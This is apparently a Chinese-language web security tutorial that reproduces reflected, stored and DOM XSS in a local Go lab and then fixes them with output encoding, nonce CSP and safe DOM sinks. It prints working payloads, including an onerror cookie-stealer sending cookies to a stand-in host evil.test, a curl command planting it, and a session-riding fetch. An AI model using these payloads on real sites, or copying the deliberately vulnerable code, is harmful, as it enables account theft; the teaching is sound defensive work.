---
title: XSS：反射、儲存、DOM 型與對應修補
description: 在自己的短網址服務上重現三種 XSS，再用輸出編碼、CSP 與安全的 DOM 寫法修好並驗證。
sidebar:
  order: 3
---

## 先想想

你在稽核自己寫的短網址服務 v1。它有個「檢舉連結」的表單：任何訪客都能填一個網址和一段備註，管理員 alice 登入後在 `/admin` 看這些檢舉。

攻擊者從沒登入過，也碰不到 alice 的電腦。他只用 `curl` 送了一筆檢舉，備註欄是一段看起來像圖片的文字。隔天 alice 打開 `/admin` 看了一眼，攻擊者的伺服器就收到了她的 Cookie。

資料明明只是存進資料庫的一段字串，為什麼會變成在 alice 瀏覽器裡跑的程式？如果把 Cookie 設成 `HttpOnly`，讀不到 Cookie 之後，攻擊者還能做什麼？

<details>
<summary>提示</summary>

想想瀏覽器怎麼把一串文字變成頁面：它不知道哪一段是你寫的版面、哪一段是別人填的資料。再想想 `HttpOnly` 限制的是「讀取 Cookie」，沒有限制「送出請求」。

</details>

## 是什麼

**跨站腳本（cross-site scripting，XSS）** 是攻擊者讓自己的 JavaScript 在你網站的頁面裡執行，因此它擁有該頁面的全部權限：讀得到頁面內容、Cookie（沒設 `HttpOnly` 時），也能用使用者的身分呼叫你的 API。

它和 [CSRF](/cyber/p2-web/2-3-cross-site/csrf/) 是一對，但強度差很多。CSRF 是借用瀏覽器自動附上的憑證「送出」請求，而且讀不到回應；XSS 的腳本跑在你的 origin 裡，[同源政策](/cs/n-network/n-4-application/same-origin-policy/) 對它完全不設限。

## 為什麼存在

根本原因是 **資料與程式碼混在同一個字串裡**。伺服器把版面和使用者資料拼成一份 HTML 送出去，瀏覽器從頭到尾只看到一串文字，靠 `<`、`"`、`</script>` 這些符號判斷哪裡是標籤、哪裡是內容。使用者資料裡剛好有這些符號，瀏覽器就照單全收。

這和 SQL 注入是同一類錯誤，差別只在直譯器換成瀏覽器的 HTML、JavaScript、URL 與 CSS 解析器。每個解析器的特殊字元不一樣，所以「跳脫」必須依輸出的位置而定。

沒有防護時的後果，是 XSS 能做到使用者能做的所有事：偷 session、改設定、在頁面上放假的登入框、記錄鍵盤輸入。而且前面的防線大多沒用：CSRF token 在頁面裡，腳本讀得到；同源政策只擋跨源，擋不了同源的腳本。

Samy 蠕蟲是最有名的例子。2005 年一位使用者在 MySpace 個人頁面放了儲存型 XSS，據報導在約 20 小時內有超過一百萬個帳號被感染（見 [Wikipedia 的 Samy 條目](https://en.wikipedia.org/wiki/Samy_(computer_worm))）。下面「常見坑」會回頭看它為什麼過得了濾網。

## 怎麼運作

:::caution
以下所有攻擊只在你自己機器上的範例服務進行，兩個主機名都指向 `127.0.0.1`。絕不要對第三方網站或你沒有書面授權的系統測試 XSS。
:::

範例在 `playground/cyber/p2-web/2-3-cross-site/xss/`。環境和 CSRF 那篇相同：`victim.test:8080` 是受害服務，`evil.test:9666` 是攻擊者，兩個主機名要先指向本機（測完記得刪掉 `/etc/hosts` 那一行）：

```bash
echo "127.0.0.1 victim.test evil.test" | sudo tee -a /etc/hosts
go run . -defense none
```

### 錯在哪裡：一行 `template.HTML`

受害服務用的是 `html/template`，它預設會依位置跳脫。要讓它變脆弱，只需要做一件事：告訴它「這份資料已經是安全的標記」。

```go title="victim.go"
// text is how user input reaches an HTML body. html/template escapes a plain
// string; template.HTML tells it "this is already markup, do not touch it",
// which is exactly the opt-out that creates the bug.
func (v *victim) text(s string) any {
	if v.safe() {
		return s
	}
	return template.HTML(s)
}
```

真實的專案裡，這一步通常包在更無害的名字下：「我們要讓使用者能用粗體」、「這欄位是富文字」。三種 XSS 都從這裡出發，差別只在資料從哪來、什麼時候進頁面。

攻擊者的酬載（payload）是同一段，它不用 `<script>`：

```go title="attacker.go"
	stealPayload = `<img src=x onerror="new Image().src='` + collector + `/steal?c='+encodeURIComponent(document.cookie)">`
```

圖片載入失敗就觸發 `onerror`，腳本把 `document.cookie` 當成網址參數送去 evil.test。

### 反射型：資料在請求裡，馬上被回顯

`/search?q=...` 把查詢字串原樣放進「找不到符合『…』」這句話。攻擊者不需要碰受害者的電腦，只需要讓她點一個連結：`http://evil.test:9666/` 頁面上的「攻擊 A」就是。在瀏覽器登入（`http://victim.test:8080/login`）後點它，終端機會印出收到的 Cookie。

```text
evil.test 的連結        alice 的瀏覽器                 victim.test:8080
    │ 點擊                  │ GET /search?q=<img onerror=…> │
    ├──────────────────────►├──────────────────────────────►│
    │                       │ 200，<img onerror=…> 在頁面裡 │
    │                       │◄──────────────────────────────┤
    │  /steal?c=session=…   │ 瀏覽器解析 → onerror 觸發     │
    │◄──────────────────────┤                               │
```

看箭頭順序：酬載隨請求出去、隨回應回來，在 alice 的瀏覽器裡才被執行，攻擊者的伺服器只負責收東西。

酬載只存在這一次請求與回應裡，所以叫「反射」。攻擊者要靠社交工程把連結送到對方手上，但不需要先在伺服器上留任何東西。

### 儲存型：資料先被存下來，之後打到每個看的人

這是「先想想」的情境。攻擊者用 `curl` 留下一筆檢舉，任何人都可以，不用登入：

```bash
curl -X POST http://victim.test:8080/reports \
  --data-urlencode 'url=https://example.com' \
  --data-urlencode "note=<img src=x onerror=\"new Image().src='http://evil.test:9666/steal?c='+encodeURIComponent(document.cookie)\">"
```

alice 登入後打開 `http://victim.test:8080/admin`，酬載就在頁面上執行。這是最危險的一種：不需要受害者點任何東西，而且打中的剛好是權限最高的人。

### DOM 型：伺服器根本沒看到

`/preview` 這頁的伺服器程式碼完全沒有問題，問題在它送出去的 JavaScript：

```html title="victim.go"
{{if .Safe}}out.textContent = text;{{else}}out.innerHTML = text;{{end}}
```

脆弱版把 `location.hash` 的內容用 `innerHTML` 寫進頁面。`location.hash`（來源，source）流到 `innerHTML`（出口，sink）之間沒有任何處理。URL 的 `#` 之後的部分不會被瀏覽器送到伺服器，所以伺服器的存取紀錄、WAF 都看不到這個酬載。攻擊 C 就是這種連結。

:::note
`innerHTML` 不會執行用它插入的 `<script>` 標籤，所以這個酬載用的是 `<img onerror>`。網路上很多「`<script>` 沒反應所以沒漏洞」的結論都是這樣誤判的。
:::

### 酬載能做什麼：把 Cookie 設成 HttpOnly 之後

偷 Cookie 是最直覺的做法，也最容易被擋。用 `go run . -defense none -httponly` 重跑攻擊 A，`document.cookie` 變成空字串，終端機收到的是 `""`。

但攻擊 B 的酬載根本不碰 Cookie：

```go title="attacker.go"
	ridePayload  = `<img src=x onerror="fetch('/settings/target',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'url='+encodeURIComponent('` + collector + `/phish')})">`
```

腳本從 victim.test 的頁面裡發出 `fetch`，這是同源請求，瀏覽器自動附上 `HttpOnly` 的 session Cookie，`/a1` 就被改走了。伺服器看到的是有效 session、`Sec-Fetch-Site: same-origin`，和 alice 自己按按鈕完全一樣。`TestHttpOnlyDoesNotStopRiding` 重現這個請求。這也是為什麼 CSRF token 擋不住 XSS：腳本一樣能先 `fetch` 設定頁、讀出 token，再帶著 token 送出。

### 防線一：輸出編碼，依位置跳脫

編碼要依資料所在的解析器來選：

| 輸出位置 | 例子 | 該怎麼做 | 攻擊者要跳出的東西 |
| --- | --- | --- | --- |
| HTML 本文 | `<p>{{.Q}}</p>` | HTML 實體跳脫 | `<` |
| HTML 屬性 | `<input value="{{.Q}}">` | 屬性跳脫，屬性值一律加引號 | `"` |
| URL 屬性 | `<a href="{{.U}}">` | scheme 白名單（http、https）再 URL 編碼 | `javascript:` |
| JavaScript | `var n = {{.Q}};` | 輸出成 JS 字串或 JSON | `</script>`、引號 |
| CSS | `style="color: …"` | 不要放使用者輸入，要放就用白名單 | `expression`、`url(` |

`html/template` 會自己判斷目前在哪個位置並套用對應的跳脫。我們用同一個酬載實測過：放在屬性裡，`"` 與 `<` 都變成實體；放在 `<script>` 裡，變成帶 `<` 的 JS 字串；放在 `href` 裡的 `javascript:` 則被換成 `#ZgotmplZ`。所以防線一幾乎不用寫新程式，而是不要關掉它：`-defense encode` 就是讓 `text` 與 `href` 把資料原樣交給樣板。

DOM 型的對應修法是換掉出口：`textContent` 把資料當文字，不會解析標籤。伺服器端另外在 `/reports` 加上 scheme 驗證，擋住 `javascript:` 網址進資料庫，這是第二層，不是主要修法。

### 防線二：CSP，讓瀏覽器拒絕執行

輸出編碼是修漏洞；**內容安全政策（Content Security Policy，CSP）** 是萬一漏了，讓瀏覽器別照做。範例用基於 nonce 的政策：

```go title="defense/defense.go"
func Policy(nonce string) string {
	return "script-src 'nonce-" + nonce + "'; object-src 'none'; base-uri 'none'"
}
```

只有帶著這次回應專屬 nonce 的 `<script>` 才能執行。注入的 `<img onerror>` 是行內事件處理器，沒有 nonce，瀏覽器會拒絕執行並在 Console 印出 CSP 違規訊息；`javascript:` 網址同理。nonce 每個回應都要重新產生，重複使用的 nonce 就只是攻擊者可以複製的通行證。

注意 `-defense csp` 沒有修漏洞：酬載仍然被寫進頁面，只是不執行。`TestCSPIsNotTheFix` 明確驗證了這件事。

### 防線三：限縮傷害與 Trusted Types

- `HttpOnly` 與 `SameSite` 讓 Cookie 不被腳本讀走，傷害變小，但上面攻擊 B 說明了它擋不住「借身分」。敏感操作（改密碼、轉帳）要求重新驗證，才擋得住被攻陷的 session。
- **Trusted Types** 讓瀏覽器強制 `innerHTML` 這類出口只接受經過你指定函式處理的值，是從根本上對付 DOM 型 XSS 的做法。支援度因瀏覽器而異，上線前先查最新的支援表。
- 使用者真的需要貼 HTML（富文字）時，用經過維護的 sanitizer（前端 DOMPurify、Go 的 bluemonday），不要自己寫過濾。

### 驗證：每種防線擋住了什麼

```bash
go test ./...
```

| `-defense` | HTML 本文（攻擊 A、儲存型） | DOM 出口（攻擊 C） | 對應的測試 |
| --- | --- | --- | --- |
| `none` | 酬載成為真正的標籤 | `innerHTML` | `TestReflectedRunsWithoutDefense`、`TestStoredReachesAdminWithoutDefense`、`TestPreviewSink` |
| `encode` | 酬載顯示成文字 | `textContent` | `TestEncodeNeutralisesReflected`、`TestEncodeNeutralisesStored`、`TestPreviewSink` |
| `csp` | 酬載仍在頁面，瀏覽器拒絕執行 | 同左 | `TestCSPNonceMatchesPageAndChangesPerRequest`、`TestCSPIsNotTheFix` |

:::note
CSP 由瀏覽器執行。Go 測試只能驗證伺服器送出的標頭與頁面上的 nonce 彼此一致、每次不同，驗證不了瀏覽器有沒有真的拒絕執行。要看到「Refused to execute inline event handler」那類訊息，得用瀏覽器打開頁面。
:::

回到一開始的問題：備註欄的字串被當成標記寫進 `/admin` 的 HTML，瀏覽器分不出那是資料，於是 `onerror` 在 alice 的 origin 裡執行，Cookie 就被送走了。`HttpOnly` 能擋住「讀 Cookie」，攻擊者還是可以讓腳本以 alice 的身分送出請求。真正的修法是在輸出時依位置編碼，讓這串字永遠只是文字；CSP 與 `HttpOnly` 是萬一漏了之後縮小傷害的第二、第三層。

## 取捨與替代方案

| 方案 | 優點 | 代價 | 適用情境 |
| --- | --- | --- | --- |
| 框架自動跳脫（`html/template`、React、Vue） | 預設就對，不用想上下文 | 一旦用 `template.HTML`、`v-html`、`dangerouslySetInnerHTML` 關掉就失效 | 所有輸出的預設 |
| 輸入驗證（白名單格式、scheme） | 讓資料本身乾淨，順便防其他問題 | 擋不住自由文字欄位；黑名單必被繞過 | 網址、數字、列舉值 |
| HTML sanitizer（DOMPurify、bluemonday） | 允許部分標籤又去掉危險部分 | 要持續更新；曾出現過突變型 XSS 繞過 | 真的要存、顯示使用者 HTML 的欄位 |
| nonce 型 CSP | 即使有漏洞也擋掉大多數注入腳本 | 所有行內腳本都要加 nonce；舊頁面要改 | 新系統的基線，搭配輸出編碼 |
| Trusted Types | 從出口根治 DOM 型 | 瀏覽器支援度不一，要改前端程式 | 前端程式碼自己掌控的單頁應用 |
| `HttpOnly`、`SameSite`、重新驗證 | 縮小被攻陷後的傷害 | 不阻止 XSS 本身，擋不住借身分 | 所有 session Cookie |
| WAF 規則 | 不用改程式，能擋已知特徵 | 靠特徵比對，會被繞過；DOM 型根本看不到 | 臨時止血，不是修補 |

建議的組合是：框架自動跳脫當主線，nonce 型 CSP 當第二層，Cookie 加 `HttpOnly`，並且不用 `innerHTML` 寫使用者資料。

什麼時候不該用或不需要：

- **不需要使用者提供 HTML 時，別用 sanitizer。** 純文字欄位直接跳脫就好，sanitizer 是為了「要保留部分標記」才存在的，用在純文字上只是多一個會出錯的元件。
- **舊系統一口氣開嚴格 CSP。** 滿是行內腳本與行內事件處理器的頁面會直接壞掉。先用 `Content-Security-Policy-Report-Only` 收集違規報告，確認沒有誤傷再改成強制。
- **把任何一層當成唯一一層。** CSP 只限制腳本執行，注入的標記仍能竄改頁面（例如放一個假的登入表單）；輸出編碼漏掉一個位置就破功；`HttpOnly` 擋不住借身分。

## 常見坑與故障案例

### 用黑名單過濾輸入

**症狀**：後端把 `<script>` 字串替換掉，測試用 `<script>alert(1)</script>` 打不進去，團隊認為已修好，卻還是有人成功注入。

**原因**：黑名單只能列出已知的寫法，而 HTML 可以執行腳本的方式比 `<script>` 多得多：事件屬性（`onerror`、`onfocus`）、`javascript:` 網址、`<svg>` 等。`<scr<script>ipt>` 這種巢狀寫法會在被過濾一次後重組成合法標籤。Samy 蠕蟲正是因為 MySpace 的過濾只擋了一批已知字串，才被繞過。

**對策**：不要「清掉壞字元」，要在輸出時依位置編碼，讓任何字元都只是文字。輸入驗證只用在格式有明確定義的欄位。

### 用 `template.HTML` 或 `v-html` 關掉跳脫

**症狀**：框架明明預設跳脫，頁面還是被注入。

**原因**：有人為了顯示「已經是 HTML」的內容，把值包成 `template.HTML`（Go）、`v-html`（Vue）、`dangerouslySetInnerHTML`（React）。範例的 `text` 函式就是這個漏洞的最小版本。如果這個值來自資料庫或使用者，就是儲存型 XSS。

**對策**：搜尋整個程式碼庫裡所有關掉跳脫的 API，列成需要審查的清單；一定要用時先經過 sanitizer，而且在 code review 時當成危險信號處理。

### 在錯的位置做編碼

**症狀**：資料明明「跳脫」過了，還是能注入。

**原因**：跳脫是依位置而定的。把資料用 `html.EscapeString` 之後放進 `href`，引號雖然被處理了，`javascript:alert(1)` 卻照樣是合法網址；把資料用 `%q` 或 HTML 跳脫放進 `<script>` 區塊，`</script>` 會被 HTML 解析器先看到並結束腳本區塊，後面的內容就成了新的標籤。

**對策**：用能辨識上下文的工具（`html/template`），不要手工拼 HTML；URL 一律驗證 scheme 白名單；要把資料交給 JavaScript 時，用 JSON 編碼後放進樣板，不要手拼。

### 出口在前端，伺服器日誌什麼都沒有

**症狀**：使用者回報頁面被注入，伺服器存取紀錄、WAF 紀錄都找不到可疑請求。

**原因**：DOM 型 XSS 的酬載在 `#` 之後，瀏覽器不會送到伺服器。漏洞在前端的 `innerHTML`、`document.write`、`eval`、`location = …` 等出口。

**對策**：用 `textContent` 取代 `innerHTML`，用 linter 禁掉危險出口，能開 Trusted Types 就開；把前端程式碼納入安全審查，不只看後端。

### 以為 HttpOnly 或 CSP 就夠了

**症狀**：Cookie 已設 `HttpOnly`，團隊把 XSS 的嚴重度降為低，不修漏洞；或 CSP 允許了 `'unsafe-inline'`，卻當作已經有防護。

**原因**：`HttpOnly` 只擋讀取 Cookie，攻擊 B 展示了腳本仍然能用使用者身分送出請求。CSP 如果允許 `'unsafe-inline'` 或用寬鬆的網域白名單，注入的腳本就跑得動；允許的網域上只要有一個可被利用的端點（例如 JSONP），也一樣繞過。

**對策**：把 `HttpOnly`、CSP 看成縮小傷害的工具，漏洞本身仍然要修。CSP 用 nonce 型，不用 `'unsafe-inline'`。

## 小練習

範例在 `playground/cyber/p2-web/2-3-cross-site/xss/`。先 `go test ./...` 確認全部通過。

**1. 預測並用瀏覽器驗證。** 不改程式，用 `-defense none` 啟動，登入後打開攻擊 A 與攻擊 C，記下終端機收到的 Cookie；再加上 `-httponly` 重跑攻擊 A 與攻擊 B。最後換成 `-defense csp`，三種攻擊各發生什麼事？儲存型要用上面的 `curl` 另外測。

<details>
<summary>參考解答</summary>

`-defense none`：攻擊 A、C 與儲存型都能收到 `session=alice-session`。加上 `-httponly` 後，攻擊 A 與 C 收到的是空字串 `""`，但攻擊 B 仍然把 `/a1` 改走，因為 `fetch` 是同源請求，Cookie 照樣附上。換成 `-defense csp`：三種都不再執行，瀏覽器 Console 會有 CSP 違規訊息，終端機收不到任何東西。但酬載仍然被寫進頁面（`TestCSPIsNotTheFix`），所以 CSP 只是第二層。

</details>

**2. 同時開輸出編碼與 CSP。** 新增 `-defense both`：`/search` 與 `/admin` 的資料要被跳脫（和 `encode` 相同），而且每個回應都帶 CSP。補上 `TestBothEncodesAndSendsCSP`，並讓 `go test ./...` 通過。

<details>
<summary>參考解答</summary>

在 `victim.go` 兩處改動：`safe()` 要把 `both` 也算進去，`newVictim` 的 `switch` 要讓 `both` 套上 CSP。

```go
func (v *victim) safe() bool { return v.cfg.Defense == "encode" || v.cfg.Defense == "both" }

// in newVictim:
	case "csp", "both":
		return defense.CSP(mux), nil
```

測試檢查兩件事：酬載不再是標籤、而且有 CSP 標頭。

```go
func TestBothEncodesAndSendsCSP(t *testing.T) {
	h := newTestVictim(t, Config{Defense: "both"})
	rec := send(h, http.MethodGet, "/search?q="+url.QueryEscape(payload), "", nil)
	if strings.Contains(rec.Body.String(), "<img") {
		t.Fatalf("payload became a live tag:\n%s", rec.Body)
	}
	if rec.Header().Get("Content-Security-Policy") == "" {
		t.Fatal("missing CSP header")
	}
}
```

這就是建議的組合：輸出編碼修漏洞，CSP 當第二層。

</details>

### 辨識

下面這段 `/admin` 頁面由 AI 產生，目的是「安全地顯示訪客送來的檢舉」。用一般的網址與備註測試，一切正常。請做 code review，找出它的問題（至少兩個）。

```go title="xss.go"
// cleanNote strips script tags so reports are safe to show in the admin page.
func cleanNote(s string) string {
	return strings.NewReplacer("<script>", "", "</script>", "").Replace(s)
}

func admin(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintln(w, "<ul>")
	for _, rep := range reports {
		fmt.Fprintf(w, `<li><a href="%s">%s</a></li>`, html.EscapeString(rep.URL), html.EscapeString(rep.URL))
		if err := rowTmpl.Execute(w, map[string]any{"Note": template.HTML(cleanNote(rep.Note))}); err != nil {
			log.Printf("render: %v", err)
		}
	}
	fmt.Fprintln(w, "</ul>")
	if len(reports) > 0 {
		fmt.Fprintf(w, "<script>const lastNote = %q;</script>", reports[len(reports)-1].Note)
	}
}
```

完整程式碼在 `recognize/xss.go`，它有 `//go:build ignore`，不會被 `go test ./...` 掃到。

<details>
<summary>參考解答</summary>

1. **`cleanNote` 加 `template.HTML`**：黑名單只拿掉兩個固定字串。備註填 `<img src=x onerror=...>` 完全不含 `<script>`，照樣在 alice 的頁面執行；`<scr<script>ipt>` 被替換一次後會重組成 `<script>`。而且 `template.HTML` 讓 `html/template` 不再跳脫，等於把防線拆掉。正確寫法是直接把字串交給樣板（不包 `template.HTML`），讓它依位置跳脫，並刪掉 `cleanNote`。
2. **`html.EscapeString(rep.URL)` 放進 `href`**：它處理了引號與 `<`，卻沒檢查 scheme，`javascript:alert(document.cookie)` 還是合法的 `href`，alice 一點擊就執行。正確寫法是寫入時只接受 `http`、`https`，輸出時交給 `html/template` 的 `href` 處理（非白名單 scheme 會變成 `#ZgotmplZ`）。
3. **`fmt.Fprintf(... "const lastNote = %q;")` 放進 `<script>`**：`%q` 輸出 Go 字串語法，不處理 HTML 解析規則。備註含 `</script><img src=x onerror=...>` 時，HTML 解析器先看到 `</script>` 就結束腳本區塊，後面的標籤成為頁面的一部分。正確寫法是用 `html/template` 把值放進 JS 位置（會輸出 `<` 之類的安全編碼），或用 `json.Marshal`（預設會跳脫 `<`、`>`、`&`）再放進樣板。

</details>

## 快閃卡

<details>
<summary>XSS 的根本原因是什麼？</summary>

資料與程式碼混在同一個字串裡：使用者資料沒有依輸出位置編碼就被放進頁面，瀏覽器把其中的 `<`、引號等當成標記，於是資料變成在你 origin 裡執行的腳本。

</details>

<details>
<summary>為什麼 XSS 能繞過 CSRF token 與同源政策？</summary>

腳本跑在受害網站自己的 origin 裡，是同源，所以讀得到頁面裡的 token，也能發同源請求；同源政策只擋跨源。

</details>

<details>
<summary>反射型、儲存型、DOM 型最大的差別是什麼？</summary>

反射型的酬載在請求裡、立刻回顯；儲存型先被存進伺服器，之後打到每個看的人；DOM 型的酬載由前端 JavaScript 從來源（如 <code>location.hash</code>）寫進出口（如 <code>innerHTML</code>），伺服器看不到。

</details>

<details>
<summary>網址是 <code>/preview#%3Cimg%20src=x%20onerror=…%3E</code>，伺服器的存取紀錄會看到酬載嗎？</summary>

不會。<code>#</code> 之後的片段不會被瀏覽器送到伺服器，所以伺服器日誌與 WAF 都看不到，漏洞完全在前端的 <code>innerHTML</code> 這類出口。

</details>

<details>
<summary>頁面用 <code>el.innerHTML = '&lt;script&gt;alert(1)&lt;/script&gt;'</code> 寫入，腳本會執行嗎？</summary>

不會，用 <code>innerHTML</code> 插入的 <code>&lt;script&gt;</code> 不會被執行。但 <code>&lt;img src=x onerror=…&gt;</code> 這類事件處理器會，所以不能因為 <code>&lt;script&gt;</code> 沒反應就說沒有漏洞。

</details>

<details>
<summary>session Cookie 設了 <code>HttpOnly</code>，注入的腳本還能改 alice 的 <code>/a1</code> 嗎？</summary>

能。<code>HttpOnly</code> 只讓 <code>document.cookie</code> 讀不到，腳本發出的同源 <code>fetch</code> 仍會自動附上 Cookie，伺服器分辨不出和 alice 本人操作的差別。

</details>

<details>
<summary>為什麼用黑名單把 <code>&lt;script&gt;</code> 字串刪掉擋不住 XSS？</summary>

能執行腳本的寫法太多：<code>onerror</code> 等事件屬性、<code>javascript:</code> 網址、<code>&lt;svg&gt;</code> 等；巢狀字串刪除一次後還會重組成標籤。正確做法是輸出時依位置編碼，不是清除壞字元。

</details>

<details>
<summary>回應帶 <code>Content-Security-Policy: script-src 'nonce-abc'</code>，頁面被注入 <code>&lt;img src=x onerror=…&gt;</code>，onerror 會執行嗎？</summary>

不會。行內事件處理器沒有 nonce，瀏覽器拒絕執行。但注入本身沒被修掉，酬載仍在頁面裡，所以 CSP 是第二層，不是修補。

</details>

<details>
<summary>為什麼 CSP 的 nonce 每個回應都要重新產生？</summary>

固定的 nonce 一旦被攻擊者讀到（例如在同一個頁面看過一次），他就能把它放進自己注入的 <code>&lt;script&gt;</code>，讓瀏覽器放行。每次不同才讓攻擊者無法預先寫好。

</details>

## 延伸閱讀

- [Cross Site Scripting Prevention Cheat Sheet（OWASP）](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)：依輸出位置列出編碼規則，本篇的位置對照表可以對著它檢查。
- [Cross-site scripting（PortSwigger Web Security Academy）](https://portswigger.net/web-security/cross-site-scripting)：三種類型與各種上下文的實驗室，可以動手練。
- [Trusted Types API（MDN）](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)：DOM 型 XSS 的出口管制機制與目前的瀏覽器支援度。
- [Mitigate cross-site scripting (XSS) with a strict Content Security Policy（web.dev）](https://web.dev/articles/strict-csp)：nonce 型 CSP 的部署步驟與常見調整。
- [`html/template`（Go 文件）](https://pkg.go.dev/html/template)：本篇使用的上下文感知跳脫的行為說明與安全模型。
